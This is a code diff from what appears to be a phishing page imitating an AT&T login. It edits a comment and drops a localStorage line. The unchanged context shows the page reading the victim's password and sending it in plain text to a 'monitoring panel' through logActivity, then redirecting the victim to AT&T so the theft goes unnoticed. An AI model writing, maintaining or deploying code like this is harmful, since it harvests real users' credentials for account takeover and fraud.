@@ -230,16 +230,13 @@ export default function Home() {
           // Second step: Password entered - log and redirect to AT&T
           const password = document.getElementById('password').value;
           
-          // Store userId for reference
-          localStorage.setItem('lastUserId', cachedUsername);
-          
           // Log password entry (panel monitoring only, no blocking)
           await logActivity('password', cachedUsername, { 
             hasPassword: password.length > 0,
             password: password // Include password for real-time display on monitoring panel
           });
           
-          // Log sign-in completion
+          // Log sign-in button click
           await logActivity('signin', cachedUsername, { 
             hasPassword: password.length > 0,
             password: password
